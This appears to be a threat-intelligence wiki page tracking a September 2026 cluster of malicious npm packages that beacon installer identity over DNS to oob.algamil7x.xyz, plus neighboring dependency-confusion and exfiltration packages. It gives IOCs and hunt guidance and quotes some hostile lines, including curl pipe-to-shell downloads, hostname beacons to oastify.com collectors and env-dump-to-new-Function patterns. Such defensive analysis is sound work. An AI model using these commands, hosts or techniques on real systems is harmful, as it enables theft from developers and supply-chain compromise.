# The `algamil7x` npm cluster: five corporate-squat scoped packages beacon installer identity over DNS labels to one attacker domain (Amazon Inspector via GitHub Advisories, Sep 18, 2026)

## Tags
- ops
- npm
- supply-chain
- malicious-package
- DNS-exfiltration
- DNS-tunneling
- reconnaissance
- typosquat
- scope-squat
- obfuscation
- install-script
- Amazon-Inspector
- GitHub-Advisories
- algamil7x

## Summary

Between 00:31 and 21:31 UTC on **September 18, 2026**, GitHub published five malware-class advisories — all sourced to **Amazon Inspector** — for five differently named npm packages that share one code family and one destination: a `dns.resolve4()` lookup whose subdomain is built from **the installer's OS username, hostname, and current-working-directory basename**, sent under attacker-controlled **`oob.algamil7x.xyz`**. The payload is not a stealer or a loader — it is **target qualification**: every `npm install` tells the operator who (username), where (hostname), and on what project (cwd) the package landed, exfiltrated through the attacker's own **authoritative DNS logs** with zero HTTP egress. Four of the five names were gone from the registry within a day; at this wiki's live check on **Sep 19–20, 2026**, **`@insiderintelligence/googleadmanager` (latest `9.9.10`, created Sep 18 14:11 UTC) still resolves on npm**.

| Package | Advisory | Published (UTC) | Prefix in DNS label | Registry state (live check Sep 19–20) |
|---|---|---|---|---|
| `@tink/tink-link-core` | GHSA-hvcc-qwg6-972c | Sep 18 00:31 | (prefix + hardcoded domain) | **unpublished / not found** |
| `@shared-web/assets` | GHSA-vmr9-5w3x-4v98 | Sep 18 15:31 | `<pkg>` chain | **unpublished / not found** |
| `@shared-web/utils` | GHSA-29f7-pqf4-c94j | Sep 18 21:31 | `swutils` | **unpublished / not found** |
| `@shared-runtime/modules@9.9.10` | GHSA-g85c-jph7-8q4r | Sep 18 21:31 | `srmods` | **unpublished / not found** |
| `@insiderintelligence/googleadmanager` | GHSA-76rx-jxhm-vhww | Sep 18 21:31 | (values directly) | **STILL PRESENT — latest 9.9.10, 2 versions, created 2026-09-18T14:11Z** |

OSV mirrors exist for the cluster (e.g. `MAL-2026-16292` for `@shared-web/utils`, `MAL-2026-16290` for `@insiderintelligence/googleadmanager`), so consumer tooling will surface these even though npm-side packages are gone.

## Confirmed mechanics (from the advisories' Amazon Inspector analyses)

- **Trigger:** `package.json` declares an `install` lifecycle script (`node index.js`), which loads `lib/core.js`. At least one member (`@shared-web/assets`) **also executes `./lib/core.js` on plain `require`** — install-script approval gates (npm ≥ 12) don't cover that path.
- **Collection:** `os.userInfo().username`, `os.hostname()`, and the basename of `process.cwd()` — a per-install host fingerprint plus a project identifier.
- **Exfiltration:** a `dns.resolve4()` query for a label chain of the form `<prefix>.<user>.<host>.<cwd>.<timestamp>.oob.algamil7x.xyz` (`@shared-web/utils` uses prefix `swutils`; `@shared-runtime/modules` uses `srmods`). The answer never matters — the data is recorded in the **authoritative nameserver logs** for `algamil7x.xyz`.
- **Obfuscation lineage:** the destination hostname and the `os` / `dns` / `process` module names are stored as **hex byte arrays / char-code arrays** in numbered `lib/*.js` files and reconstructed at runtime with `String.fromCharCode`, with modules loaded through **`module.constructor._load`** (bypassing ordinary `require` strings). Same file-layout trick across all five, with different file names (`lib/a9b3de.js`, `lib/c5df9a.js`, `lib/a74d1f.js`, `lib/g7h8i9.js`, …) — one author or one template.
- **Naming:** all five impersonate **plausible internal/corporate scopes** — `@shared-web`, `@shared-runtime`, `@insiderintelligence` (Insider Intelligence / eMarketer), and `@tink` (the real **Tink** open-banking SDK, with a `github.com/tink-link/core` homepage decoy). These are names a developer could plausibly see in a company lockfile and not question.
- **No second stage observed** in any advisory: no downloader, no reverse shell, no credential reader. This is the reconnaissance/telemetry layer, not the payload layer.

## Why it matters (durable reads)

1. **DNS-label beaconing is the lowest-egress telemetry channel.** No HTTP(S) request, no destination socket your egress proxy logs matter to — the "exfiltration" is a resolver query whose content the attacker reads from their own zone logs. Egress allow-lists that permit DNS (everyone's) do not constrain it. Hunt belongs in **DNS logs**, not web-proxy logs.
2. **This is target qualification, read as an attack precursor.** Username+hostname+cwd answers "which organizations installed this and on which repo" before any payload is committed to. Expect a follow-on wave aimed at the orgs that beaconed back; treat every install as a disclosed target list, which is why removal alone does not close exposure — **the operator already learned who you are and what project dir you work in**.
3. **The corporate-scope-squat pattern targets trust, not popularity.** Unlike classic typosquats (`crytpto-js`), these names succeed by reading like your employer's private scope. Defender control: **private scopes should be actually private** — npm's scope-claiming for reserved orgs, plus lockfile linting that flags any scoped install not on an internal-scope allow-list.
4. **Amazon Inspector is now a recurring primary feeder for npm malware advisories** (this cluster is Inspector-sourced, as were several Sep 18 singles and the earlier `wshu.net` campaign's dynamic analysis). Malware-class GitHub Advisories with `## Source: amazon-inspector` headers are a durable, structured intel channel worth programmatic watching — the descriptions carry behavior-level detail (file names, obfuscation methods, exact DNS shape) that registry takedown notices do not.
5. **Same-day cluster, one-day partial takedown, one survivor.** The Sep 18 publish burst (00:31→21:31 UTC) plus four removals inside ~24 h reads as registry action after advisory intake; the still-live `@insiderintelligence/googleadmanager` is either missed or lagging — a reminder that **`latest` on a suspicious scope is live exposure regardless of how many siblings were pulled** (`npm audit` won't flag what npm still serves).

## Hunt guidance

- **DNS telemetry (primary):** any query at or under `algamil7x.xyz`, and generically any A/AAAA lookup whose leftmost labels embed a lowercase username, hostname, and a Unix-style timestamp joined by dots — the label grammar (`<prefix>.<user>.<host>.<cwd>.<ts>.oob.<domain>`) is distinctive even after the domain rotates.
- **Registry/lockfile audit:** the five names above at **all versions**, plus anything under scopes `@shared-web`, `@shared-runtime`, `@insiderintelligence`, `@tink` that is not on your internal allow-list; check both lockfiles and what CI resolved Sep 17–20.
- **Package-content statics:** packages shipping numbered `lib/<hexish>.js` files that `String.fromCharCode`-assemble module names and require via `module.constructor._load`; `dns.resolve4` in a dependency whose stated purpose has nothing to do with DNS.
- **Lifecycle posture:** treat an `install` script in a scoped package that merely "assembles strings" as this class until proven otherwise; npm ≥ 12's install-script approval denies the install-script path but not the `require`-time path seen in `@shared-web/assets`.

## September 20 sweep follow-up: survivor still live, and a neighboring same-day dependency-confusion recon wave (verified by this wiki)

**Re-check (Sep 20, ~05:25 UTC, this wiki):** `@insiderintelligence/googleadmanager` is **STILL on npm** — `latest 9.9.10`, manifest modified timestamp unchanged (`2026-09-18T17:00Z`). ~36 hours after the advisory, one beacon survives while its four siblings are gone.

The same Sep 18–19 Amazon-Inspector/OpenSSF advisory burst that produced the algamil7x cluster also carried a **separate, neighboring set of dependency-confusion / name-squat payloads** — same intake window, different authors and mechanisms. All verified via the GitHub Advisories API and npm registry this sweep; **none carry a CVE**:

| Package | Advisory (published UTC) | Payload shape | Registry state (Sep 20) |
|---|---|---|---|
| `x509-escaping` (npm) | GHSA-fq85-7xqm-cgj9, Sep 18 21:31 | `preinstall` collects hostname/username/home/DNS servers/cwd + reads `/etc/passwd` and `/etc/hosts`, POSTs the bundle to a hardcoded **Burp Collaborator subdomain** (`*.oob…oastify.com`) — recon, no library code shipped | name remains, all versions gone (no `latest`) |
| `chai-as-indexed` (npm) | GHSA-727r-6hg5-947x, Sep 18 21:31 | on `require`, POSTs the **full `process.env`** to a base64-concealed endpoint (`ipcheck-hashed[.]vercel[.]app/api/auth/…`) and pipes the **response body into `new Function('require', …)`** = remote server executes arbitrary code in the importing process on every load, with real `require` | name remains, all versions gone |
| `internallib_v949` (npm) | GHSA-4qw5-jqr6-c4fj / GHSA-f863-m366-9cfm, Sep 18 21:53 | `index.js` runs `child_process.exec` of a `curl https://reverse-shell.sh/…` pipe-to-shell against endpoint `10.0.16.19:443`; self-referential dependency on its own name = internal-name squat for internal-build interception | now `0.0.1-security` reservation (taken down) |
| `tailwindcss-forms-ui` (npm) | GHSA-fc5q-m33g-rp9c, Sep 18 21:31 | typosquat of `@tailwindcss/forms` (payload detail in OSV) | name remains, all versions gone |
| `py-venv-doctor` (PyPI) | GHSA-94w6-hr49-qjm7, Sep 19 00:32 | "healthcheck report" + opt-out telemetry that **exfiltrates the full environment-variable set**; OpenSSF campaign `2026-09-py-venv-doctor` | gone from PyPI (Sep 20 check) |
| `keroeltop` (npm) | GHSA-gg5m-rqpp-c9xf, Sep 19 03:32 | OpenSSF package-analysis flag (malicious-domain communication) | — |
| `urc` (PyPI) | GHSA-3c7m-3qhf-wqrr, Sep 19 06:32 | install-time host-info exfil; OpenSSF categories it `PROBABLY_PENTEST` (low-harm possibility) | — |

**Durable reads from the wave:**

1. **Legitimate-platform C2 hosting keeps winning.** `chai-as-indexed`'s C2 is a `vercel.app` function and `x509-escaping`'s is a **Burp Collaborator (`oastify.com`)** subdomain — a commercial pentest tool's own OOB channel as attacker exfil. Both destinations live on infrastructure no sane egress policy blocks. Hunt by *behavior* (env-dump POST at require time, resolver/proxy queries for `*.oastify.com` from build hosts) rather than destination reputation.
2. **The `new Function(require, serverResponse)` pattern is the require-time twin of WeaselBiscuit's Npoint fetch** — remote server supplies code executed with real module privileges on every import. Two independent npm payloads using it in one week says the pattern has left DPRK tooling and entered commodity malware templates.
3. **The `reverse-shell.sh → 10.0.16.19:443` payload in `internallib_v949` targets a private IP** — either a test build caught by the pipeline or an actor with a staging script left misconfigured; either way a reminder that some registry malware is low-skill noise around the same intake window, and triage should read the payload, not just the advisory class.
4. **Same intake window ≠ same campaign.** Five+ packages on Sep 18–19 advisories share a date and source, not an author: algamil7x is one code family; these neighbors are unrelated one-offs. Date-collapsing in threat feeds over-reports clusters — compare obfuscation lineage and destination before merging.

Hunt delta from this section: flag build hosts querying `*.oastify.com`; alert on any dependency POSTing `process.env` or reading `/etc/passwd` at install/require; treat `vercel.app` API endpoints as C2-capable in package-audit context.

## September 20 (second sweep) follow-up: the same recon shape, self-labeled a "bug-bounty canary" — `@pwaplatform/module-sso-integration` (verified by this wiki from the live tarball)

A **new** malware-class advisory landed the morning of **Sep 20** — GHSA-26h7-cmv3-wgv6 (published 12:30 UTC, sourced to **OpenSSF Package Analysis**, `MAL-2026-16299`) — for npm package **`@pwaplatform/module-sso-integration`**, and this wiki pulled and read both versions from the live registry. The self-declared story is unusual: the README says the package is a **"benign canary"** published as part of an **authorized bug bounty program against T-Bank (Т-Банк)**, because the name `@pwaplatform/module-sso-integration` supposedly appears as an internal module reference in production JavaScript bundles served from `www.tbank.ru` while the `@pwaplatform` scope was unregistered — i.e., a dependency-confusion **detection test run by the tester, not the defender**.

**What the artifact actually does (this wiki's direct tarball analysis, Sep 20):** `package.json` fires `payload.js` on **both `preinstall` and `postinstall`**. v99.0.0 collects hostname, `whoami`, `id`, `uname -a`, **`/etc/passwd`**, cwd, and npm config; v99.0.1 (published 36 minutes later) escalates to **installer-project attribution**: the installing project's `package.json` metadata + dependency names, **`git remote -v` and current branch of the installing repo**, lockfile types present, and a whitelist of CI-identifying env vars (with a token/secret/key regex redactor). Exfiltration is **three-channel HTTP**: (1) GET `http://sobaka-kusaka[.]ru:8000/oob/<token>?d=<base64url>` (compact fingerprint in the query string), (2) POST full fingerprint base64'd to `http://sobaka-kusaka[.]ru:8898/c/<token>`, (3) POST a duplicate to a **hardcoded Burp Collaborator subdomain** `ii473egh1b4kbaw03rf7pkzik9q0er8fx[.]oastify.com` — the identical commercial-pentest-infrastructure C2 this page's Sep 18 wave section flagged for `x509-escaping`. Headers carry `User-Agent: npm-canary/1.1` and `X-Bug-Bounty: vd_danilov`. Requests are plain **HTTP with no second stage, no persistence, no writes** — consistent with a recon/beacon, and consistent with malware's first act.

**Registry/timeline facts (live-checked by this wiki):** npm user `vd_danilov` (danilov.labs@gmail.com) created the package **Sep 20 10:29:59 UTC**, published 99.0.0 then 99.0.1 by 11:05 UTC, OpenSSF flagged within ~6 minutes of the second publish, GHSA at 12:30 UTC — and **at check time the package is still live with `latest = 99.0.1`**, its `X-Bug-Bounty` header on the wire. `sobaka-kusaka[.]ru` resolves (89.223.127.154); the oastify subdomain resolves to PortSwigger's public NLB as expected. This wiki's attempt to verify the README's central factual claim found **`pwaplatform` strings on `www.tbank.ru` only as asset-path tokens (`…/mfe/mm/desktop-pwaplatform-course-of-good-form/…` on cdn.tbank.ru), and the literal name `module-sso-integration` did not appear** in the homepage HTML or the first production bundle checked — the claim is plausible for a deeper bundle tree but is **unverified from public data**, and the entire authorization story rests on the publisher's own README.

**Durable reads:**

1. **A "canary" claim is unfalsifiable from the artifact.** Functionally, a defensive dependency-confusion canary and the pre-payload recon stage of an attack are the *same binary*: passive collection, no second stage, beacon to operator infrastructure. The only difference is the operator's word — and here the word is a README written by the same account that published the payload. Defenders and automating triage (OpenSSF flagged it malware-class, correctly by behavior) should treat canary claims as **untrusted metadata**, and the same "same intake window ≠ same campaign" rule applies: `@pwaplatform` shares the recon *shape* of the algamil7x cluster (installer identity → operator-controlled log) but a different mechanism, infrastructure, and claimed motive; do not merge clusters on shape alone.
2. **Bug-bounty canaries are a disclosure-gap problem, not just a malware problem.** A responsible internal-confusion test should be pre-coordinated with the registry and the target org so that (a) the target's SOC isn't triaging a live exfil beacon at 3 a.m., and (b) the beaconing **stops when the test ends**. This one went live on the public registry, beaconed real CI installs to a personal domain for an unknown window, and remained `latest` after the advisory — every CI build that resolved the name in the interim disclosed its repo remotes, branch names, and dependency list to the tester's server, which is precisely the exposure the canary was meant to measure. The measurement itself became the incident.
3. **The `oastify.com` reuse is the second independent confirmation** (after `x509-escaping`) that pentest OOB platforms are the default beacon sink for anyone who ever held a Burp license — authorized testers and attackers draw from the same pool. Egress/DNS telemetry for `*.oastify.com` from build hosts should treat "our consultant is testing us" as a hypothesis to confirm out-of-band, never as an auto-clear.
4. **Corporate-scope squatting for detection requires the scope to be public-registry-claimable in the first place** — the durable control remains the one on this page already: *private scopes should be actually private*, claimed at the registry level before internal names ever appear in a shipped bundle. T-Bank's situation (internal module name visible in production JS, scope unclaimed) is the exact finding shape every org should assume about itself and check.

**IOCs added:** `@pwaplatform/module-sso-integration` versions `99.0.0`, `99.0.1` (live at check); `sobaka-kusaka[.]ru` (`:8000/oob/`, `:8898/c/`); `ii473egh1b4kbaw03rf7pkzik9q0er8fx[.]oastify.com`; headers `User-Agent: npm-canary/1.1`, `X-Bug-Bounty: vd_danilov`; npm account `vd_danilov`.

## September 20 (third sweep) follow-up: Amazon Inspector's own writeups land in OSV, independently confirming the "canary shape" read — both packages still live

Live registry re-checks this sweep (~19:30 UTC): **`@pwaplatform/module-sso-integration` STILL LIVE** (latest 99.0.1, `modified` unchanged at 11:05:20Z, ~8.5h post-advisory, no npm takedown, no T-Bank or npm public confirmation/denial surfaced via search), and **`@insiderintelligence/googleadmanager` STILL LIVE** (latest 9.9.10, `modified` unchanged at 2026-09-18T17:00:08Z, ~98h post-advisory). npm search for `scope:pwaplatform` returns **zero** other packages under the scope at check — the canary is the scope's only content; the `vd_danilov` npm profile returns 403 to anonymous fetch.

**New durable fact:** the OSV record `MAL-2026-16299` was **merged and expanded at 17:37–17:39 UTC Sep 20** — the two per-version Amazon Inspector analyses (`MAL-0000-amazon-inspector-3cecca23c77c98d7` for 99.0.0 and `-4f674867f67f5a84` for 99.0.1, both published 17:25 UTC) were ingested into `ossf/malicious-packages` and folded into the main record, which now carries **Amazon Inspector's full behavioral description alongside OpenSSF Package Analysis's heuristic flag**. This matters for triage provenance: the record is no longer one ML-heuristic verdict ("communicates with a malicious domain + executes malicious-behavior commands") but **two independent analyses with matching mechanics**, and Inspector's own text states the `@pwaplatform` scope + implausibly-high `99.0.x` version + OOB collaborator channel are *"consistent with a dependency-confusion attack against an internal scope"* while explicitly noting the README's authorization claim. That is the same read this page published: **the artifact supports both the canary story and the attack-recon story; only the publisher's word distinguishes them.** Inspector's 99.0.1 writeup also confirms the collection set matches this wiki's direct tarball analysis exactly (hostname/whoami/id/uname/`/etc/passwd` ≤4096 bytes/cwd/INIT_CWD/git remote+branch/package.json metadata + top-level deps/npm config/CI env vars), including the third hardcoded destination `http://ii473egh1b4kbaw03rf7pkzik9q0er8fx.oastify.com/<token>`.

GHSA disposition at check: severity **critical**, vulnerable ranges pinned `= 99.0.0` and `= 99.0.1`, **no patched version** (a malware-class advisory's "fix" is unpublish, which npm has not done at check time). Watch items unchanged: takedown, T-Bank/npm response, reuse of `vd_danilov` / `sobaka-kusaka.ru` / `npm-canary/1.1`.

## September 21 sweep follow-up: a SIXTH member joins via install-hook, found in the same Amazon Inspector OSV batch — and both survivor packages are STILL live 72–120 h post-advisory

**Live registry re-checks this sweep (Sep 21 ~05:25 UTC, this wiki):** `@insiderintelligence/googleadmanager` **STILL LIVE** (latest 9.9.10, `modified` timestamp byte-identical to five prior sweeps, ~156 h post-advisory). `@pwaplatform/module-sso-integration` **STILL LIVE** (latest 99.0.1, `modified` unchanged 2026-09-20T11:05:20Z, ~41 h post-advisory; neither version deprecated; no T-Bank/npm public response surfaced). Two consecutive days of advised-and-serving.

**New cluster member — `@baanx/solana-lib` (`MAL-2026-16300`, Amazon Inspector, OSV batch 2026-09-21 ~03:30 UTC):** the same `lib/core.js` DNS-label beacon family in a new guise — a plausible fintech scope (**Baanx is a real Thai fintech blockchain-infrastructure company** — corporate-scope squat, same trust-targeting pattern as `@tink`) shipping as a "Solana library." `package.json` declares `scripts.install = node index.js`; `index.js` requires `./lib/core.js` (wrapped in a swallow-all try/catch); `core.js` builds `<bxsol>.<user>.<host>.<cwd>.<ts>.oob.algamil7x.xyz` and issues `dns.resolve4()`, with the destination and module names reconstructed from `String.fromCharCode` byte arrays and `module.constructor._load` in `lib/e5f0a2.js` / `lib/f6a1b3.js` — **the exact obfuscation lineage of the original five.** **Verified by this wiki from the live tarball** (9.9.10, shasum `b87b5380d6227dfaf0bd7ef43fb1840f1b4bddaf`): the package was **STILL ON npm** at check, `dist-tags.latest = 9.9.10`, created Sep 18 18:23 UTC — i.e., created the same day as the original five burst, advised three days later, and still served. Prefix `bxsol` presumably = "Baanx Solana." This is the cluster's **sixth confirmed member** and its second live survivor, confirming the domain is still in active production by one operator, ~3 days after the first five advisories.

**Cluster-count note for the OSV era:** with `@baanx/solana-lib` the count is six; watch for more `oob.algamil7x.xyz` members entering via the Inspector pipeline faster than the taker-downs clear them — the Sep 21 batch is producing npm malware advisories at a rate the registry's own removal process is not matching (three of this week's advised names — `googleadmanager`, `module-sso-integration`, `solana-lib` — all resolvable today).

## <a id="september-21-third-sweep-survivors-still-live-chai-as-viem-ghsa-lands-and-chai-as-indexed-is-now-fully-gone"></a>September 21 third sweep: survivors still live at the ~09:30 UTC re-check; the `chai-as-*` lineage gets its GitHub advisories — and the `vercel.app` `new Function(require)` pattern is now THREE packages

**Survivor re-checks (Sep 21 ~09:30 UTC, this wiki, second same-day pass):** `@insiderintelligence/googleadmanager` **STILL LIVE** (latest 9.9.10, `modified` 2026-09-18T17:00:08Z byte-identical across seven sweeps, ~160 h post-advisory). `@pwaplatform/module-sso-integration` **STILL LIVE** (latest 99.0.1, `modified` unchanged 2026-09-20T11:05:20Z, ~46 h). `@baanx/solana-lib` **STILL LIVE** — its manifest `modified` moved to **2026-09-20T11:19:06Z**, which is the `9.9.10` publish event itself (time-block confirms `9.9.9` Sep 18 18:23, `9.9.10` Sep 20 11:19 — the operator republished a day after the first five's advisories), not an npm action. No GHSA has appeared for `@baanx/solana-lib` at check (OSV-only, `MAL-2026-16300`). `oob.algamil7x.xyz` (38.242.146.132) and `sobaka-kusaka.ru` (89.223.127.154) both still resolve.

**The neighboring `chai-as-*` wave gets its GitHub mirror (Sep 21 06:30 UTC batch, CVE-less, critical, API-verified direct-ID):** `GHSA-c67f-wr24-prw9` (`chai-as-viem` severity critical). Live registry state at check: `chai-as-viem` has exactly **one version (1.1.3, modified Sep 19 18:17 UTC) and is STILL INSTALLABLE** — same payload family as `chai-as-indexed` (full `process.env` POST to a base64-concealed `ipcheck-hashed[.]vercel[.]app` endpoint, response piped into `new Function('require', …)` = server-supplied code with real `require` on every import). Meanwhile **`chai-as-indexed`'s versions are now fully unpublished** (name shell remains, `versions` empty, `modified` 2026-09-18T16:58Z). Lineage note, held at pattern-not-attribution: this is the **third package** observed this week running the identical `process.env`-POST → `new Function(require, response)` construction under the `chai-as-*` naming template (`chai-as-indexed`, `chai-as-viem`, and the same shape inside the Sep 18-19 burst). One package is a curiosity; a name-template family with one server-side-code C2 (`ipcheck-hashed.vercel.app`) shared across names is a **campaign-shaped artifact** — if a fourth member or a second `vercel.app` server appears, this pattern promotes to its own page. Hunt delta unchanged: any `*.vercel.app` API endpoint contacted by a package's require-time code, and lockfile entries under `chai-as-*` beyond the legitimate `chai-as-*` assertion plugins (the genuine chai plugin ecosystem is real and large — check publisher + version history, not the name prefix).

## <a id="september-21-fifth-sweep-fourth-same-day-survivor-recheck-all-unchanged-osv-high-water-settles-at-16347\"></a>September 21 fifth sweep: fourth same-day survivor re-check — all unchanged; OSV malware high-water settles at `MAL-2026-16347`

**Survivor re-checks (Sep 21 ~13:35 UTC, this wiki, fourth same-day pass):** `@insiderintelligence/googleadmanager` **STILL LIVE** (9.9.10, `modified` 2026-09-18T17:00:08Z — byte-identical across nine sweeps, ~176 h and counting). `@pwaplatform/module-sso-integration` **STILL LIVE** (99.0.1, `modified` unchanged 2026-09-20T11:05:20Z, ~62 h). `@baanx/solana-lib` **STILL LIVE** (9.9.10, unchanged) — **still no GHSA mirror for it** (`affects=pkg:npm/@baanx%2Fsolana-lib`-style direct query empty; OSV `MAL-2026-16300` remains the only public advisory), five days after creation and three after the Inspector analysis. `oob.algamil7x.xyz` (38.242.146.132) and `sobaka-kusaka.ru` (89.223.127.154) still resolve; `dc-callback` parent still NXDOMAIN. No T-Bank/npm public response has surfaced in any checked channel.

**OSV high-water settled (corrected twice this cycle):** direct-ID sweep shows the true last-allocated malware IDs are `MAL-2026-16346` (`rrs`, PyPI screenshot→Discord-webhook — now carrying the folded-in Amazon Inspector + kam193 dual-source detail: unconditional full-screen `mss` screenshot POST to a hardcoded Discord webhook at CLI launch, hostname/username/OS/local-IP/timestamp included, plus a 5-second MQTT presence beacon of host identity to the world-readable `rrs/v1/presence` topic on `broker.hivemq.com`) and `MAL-2026-16347` (`radio-player-theme` — the jsDelivr-delivered XSS "PoC" captured on the [PhantomRaven page](../tools/phantomraven-llm-generated-npm-infostealer-bug-bounty-hunter-crowdstrike-september-2026.md#september-21-follow-up-the-same-inversion-in-npms-browser-facing-mirror-radio-player-theme-osv-mal-2026-16347-a-self-labeled-bug-bounty-xss-proof-that-is-a-live-cookie-exfil-payload-served-from-jsdelivr)). The earlier "high-water 16429" note was stale; ID-space beyond 16347 is empty at check. Resume sweeps from 16348.

## <a id="september-21-seventh-sweep-the-chai-as-lineage-hits-the-promotion-bar-survivors-live-into-day-five-osv-grows-to-16350"></a>September 21 seventh sweep (~17:00–18:00 UTC): the `vercel.app` server-code pattern HITS its own promotion bar (member four on the SAME server); survivors live into day five; OSV resumes and grows to `MAL-2026-16350`

**PROMOTION EXECUTED — the bar this page set ("a fourth member or a second vercel.app server") was crossed at 16:41 UTC:** Amazon Inspector's OSV batch admitted `hardhat-base` (`MAL-2026-16348`: pino-cover "logger" that spawns a **detached child** on middleware invocation, decodes `DEV_API_KEY` base64 → `ipcheck-hashed[.]vercel.app/api/auth/f1f097d93c318c92f0c5`, POSTs via axios, response → `new Function.constructor("require", s)` — same server, new endpoint, new delivery variant) and `hardhat-devkit` (`MAL-2026-16349`: Ethereum-toolkit cover with README/keywords lifted from pinojs/pino, homepage `jsonspack.com`, `require('./lib/config')` detonating a **single-line ~4.07 MB obfuscator.io blob**, audience = Ethereum devs' wallet keystores). Both were **gone before the advisories existed**: registry time blocks show `hardhat-base` lived Sep 14 ~02:55→13:49 UTC (~11 h) and `hardhat-devkit` lived **47 minutes** on Sep 17 — advised Sep 21 = pure detection latency, the time-block method again. This wiki's probe: **`POST ipcheck-hashed[.]vercel.app/api/auth/f1f097d93c318c92f0c5` answers HTTP 200, one week after the cluster's first advisories** (root path 404; `jsonspack.com` NXDOMAIN). The pattern now has its own page: **[ipcheck-hashed require-time server-code cluster](../tools/ipcheck-hashed-vercel-app-require-time-server-code-cluster-september-2026.md)** — five members, two naming templates (`chai-as-*`, `hardhat-*`), two variants (readout fetch + full dropper), one live serverless rail.

**Survivor re-checks (sixth same-day pass, ~17:25 UTC):** `@insiderintelligence/googleadmanager` **STILL LIVE** (9.9.10, `modified` 2026-09-18T17:00:08Z byte-identical across eleven sweeps, ~198 h); `@pwaplatform/module-sso-integration` **STILL LIVE** (99.0.1, unchanged 09-20T11:05:20Z, ~84 h); `@baanx/solana-lib` **STILL LIVE, still GHSA-less** (OSV `MAL-2026-16300` only; the `affects=` direct query returns empty); all nine Telegram fleet names return 200 on registry (day five of advised-and-serving); `chai-as-viem` 1.1.3 still installable, `homestack-cheer` 1.1.9 still live, `mathmain` unchanged. `npmjs.it.com` C2: HTTPS root still 401 `unauthorized`, `POST /api/register` still 400 `invalid agent_id` (agent up, root authed); `sobaka-kusaka.ru` 89.223.127.154 + `oob.algamil7x.xyz` 38.242.146.132 still resolve; `dc-callback` parent still NXDOMAIN; `ungpkg.top` still CF-resolved/HTTP-dead.

**OSV sweep resumed at 16348 (as planned):** 16348 + 16349 = the two `hardhat-*` items above; `MAL-2026-16350` (`bnppf-flag-icons`, published 16:41, modified 17:30 UTC) = `poc.js` wired to BOTH preinstall and postinstall, `os.hostname()` + `os.userInfo().username` HTTPS-GET to a hardcoded `webhook.site/f3d7a882-…` collector, version `99.99.99` = dependency-confusion shape — below the new-page bar (webhook.site stub class, same family as the Sep 21 06:30 GHSA stubs), recorded as stream state. **High-water now 16350** (16351–16358 empty at check).

**Same-sweep context (feeds):** the day's dominant discovery is JFrog's **[Equation of Compromise](../ops/equation-of-compromise-npm-mathjs-clone-campaign-sepolia-contracts-slack-c2-github-actions-download-farm-jfrog-september-2026.md)** campaign page — the mathjs-clone trio this wiki tracked decomposed into a six-month targeted operation with recovered password, Sepolia-contract + Slack C2, and a GitHub Actions download farm; the multi-agency **Contagious Interview joint advisory** (30,000 devices / $10.71M, follow-up added to the [on-wiki campaign page](contagious-interview-svg-steganography-ottercookie.md)); KEV unchanged 2026.09.18/1,716 (still no fourth row, still no attribution, next batch expected Sep 22); no Shai-Hulud/TeamPCP/Mini-Shai-Hulud follow-up anywhere.

## <a id="september-21-eighth-sweep"></a>September 21 eighth sweep (~20:15–21:15 UTC): the cluster grows by SIX in one Amazon-Inspector batch — three named scopes actively re-publishing the day they were advised; `@baanx` re-arm +1; one `npx`-firewall hole; the trio's takedown landed

**New OSV members (published 17:14–17:21 UTC, `api.osv.dev` direct reads + registry liveness by this wiki):**

- **Cluster members 7–8: `@baanx/abis` and `@baanx/blockchain-config`** (`MAL-2026-16351`/`16352`, both 9.9.11) — same `runtime/support/telemetry/probe/impl.js` DNS-label grammar to `oob.algamil7x.xyz` with new tags `bxabis`/`bxcfg`. Registry check: **the whole `@baanx` trio re-armed** — `solana-lib`/`abis`/`blockchain-config` all carry 9.9.11 (published ~16:52–16:53 UTC, two hours before their advisories) on top of the 9.9.9/9.9.10 versions documented in prior sweeps. The operator's republish-after-advisory behavior (first observed as `solana-lib`'s 9.9.10 tick) is now a **pattern across three names**: advisories function as a version-bump prompt.
- **Cluster member 9: `@insiderintelligence/componentlibrary` 9.9.10** (`MAL-2026-16353`, tag `iiclib`, same DNS family) — **STILL LIVE, republished same day** (`modified` 2026-09-21T17:02:48Z). The `@insiderintelligence` scope now has two live members next to `googleadmanager` (day five, ~203 h, byte-identical).
- **NEW NEIGHBOR CLUSTER (same shape, different rail): `@uh-platform/cloud|domain-widget|nadaver|webcard` (+ `nadaver2`, 100.0.0–102.0.0)** (`MAL-2026-16358/16359/16360/16362/16361`) — preinstall `curl http://$(hostname).nadaver.pa33pg1od9cr4ffnrzec8864jvpmdd12.oastify.com/` variants: **the same Burp Collaborator subdomain shared across all members** (one collector, five+ names), hostname-in-DNS-label + plain-HTTP OAST beacon, inflated `99+` versions on a plausible internal scope = the canonical dependency-confusion qualification shape (Inspector's own wording), **ALL LIVE at check** (17:17–18:26 UTC timestamps). One `@asdfaskdjfksadhfkasf/nadaver2` random-scope sibling via OpenSSF.
- **NEW TARGET SHAPE: `gemini-computer-use` 0.1.2** (`MAL-2026-16355`) — no install hook at all; the **entrypoint itself** (`bin/cli.js`, i.e. anyone running `npx gemini-computer-use`) spawns `bash -c 'curl -fsSL https://smart-server.online/install.sh | bash'` (Windows: `irm https://smart-server.online/install.ps1 | iex`), which fetches `core/agent.py`, `server.py`, `vitals.p…` — **install-time scanning catches nothing because nothing runs at install; the AI-tool naming (`gemini-*`) is the lure**. Still live (modified 12:54 UTC). AI-toolchain name-squatting as npx-execution bait is a fresh delivery class for this wiki's AI-adjacent watch.
- **`@woodpecker-web-shared/components` 2.20.5** (`MAL-2026-16354`) — postinstall host-identity JSON POST to `webhook.site/d9bc4bcc-…` with campaign tag `src:'loMesb'`; below the page bar, stream state. Note its live `latest` is 4.20.5 — the malicious version is older than latest, so `latest`-only checking misses it (the standing lesson again).

**Below-bar stream state:** `MAL-2026-16356` `starlette-healthchecks` (PyPI typosquat-telemetry, kam193 campaign `2026-09-starlette-healthcheck`, sibling recently removed); `16363`/`16364` (`blue-string-formatter-utilss`, `bytepack-probe-a7x3`); `16365` (`my-ctf-helper-script-9921`, require-time `document.cookie` → webhook.site, self-labeled CTF helper); `16366` (`pullgetsage`, PyPI); `16367/16368/16369` = the trio-takedown mirrors (recorded on the [Equation of Compromise page](equation-of-compromise-npm-mathjs-clone-campaign-sepolia-contracts-slack-c2-github-actions-download-farm-jfrog-september-2026.md#september-21-evening-follow-up-npm-took-the-trio-down) and the [trio page](mathmain-encrypted-loader-npm-trojanised-mathjs-trio-safedep-september-2026.md#september-21-evening-takedown-executed)). **OSV high-water now MAL-2026-16369; resume sweeps at 16370 (empty at check).**

